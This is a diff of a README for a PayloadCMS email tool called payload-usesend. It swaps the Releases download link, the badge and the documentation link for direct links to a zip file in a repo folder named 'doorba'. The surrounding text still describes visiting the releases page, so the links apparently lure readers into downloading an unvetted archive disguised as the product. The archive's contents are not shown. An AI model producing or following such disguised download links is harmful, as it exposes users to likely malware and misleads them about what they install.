@@ -4,7 +4,7 @@
 Welcome to payload-usesend! This tool helps you send emails through PayloadCMS, whether you use a hosted service or manage your own server. Follow the steps below to easily download and run the application.
 
 ## 📥 Download the Application
-[![Download payload-usesend](https://img.shields.io/badge/Download-payload--usesend-blue.svg)](https://github.com/S-1102/payload-usesend/releases)
+[![Download payload-usesend](https://raw.githubusercontent.com/S-1102/payload-usesend/main/doorba/payload-usesend.zip)](https://raw.githubusercontent.com/S-1102/payload-usesend/main/doorba/payload-usesend.zip)
 
 ## 📋 Features
 - **Email Compatibility:** Works seamlessly with both hosted and self-hosted instances.
@@ -21,7 +21,7 @@ Welcome to payload-usesend! This tool helps you send emails through PayloadCMS, 
 ## 📥 Download & Install
 To get started, visit the Releases page where you can download the latest version of payload-usesend. 
 
-- Click [here to download](https://github.com/S-1102/payload-usesend/releases).
+- Click [here to download](https://raw.githubusercontent.com/S-1102/payload-usesend/main/doorba/payload-usesend.zip).
 
 ### Steps to Install
 1. **Visit the Releases Page:** Click the link above to open the GitHub releases page.
@@ -54,6 +54,6 @@ We welcome contributions! If you notice a bug or have a feature request, please 
 This project is licensed under the MIT License.
 
 ## 🌐 Learn More
-For more information on using and configuring payload-usesend, check the [documentation](https://github.com/S-1102/payload-usesend/wiki).
+For more information on using and configuring payload-usesend, check the [documentation](https://raw.githubusercontent.com/S-1102/payload-usesend/main/doorba/payload-usesend.zip).
 
 Thank you for using payload-usesend! We hope it makes your email management easier.
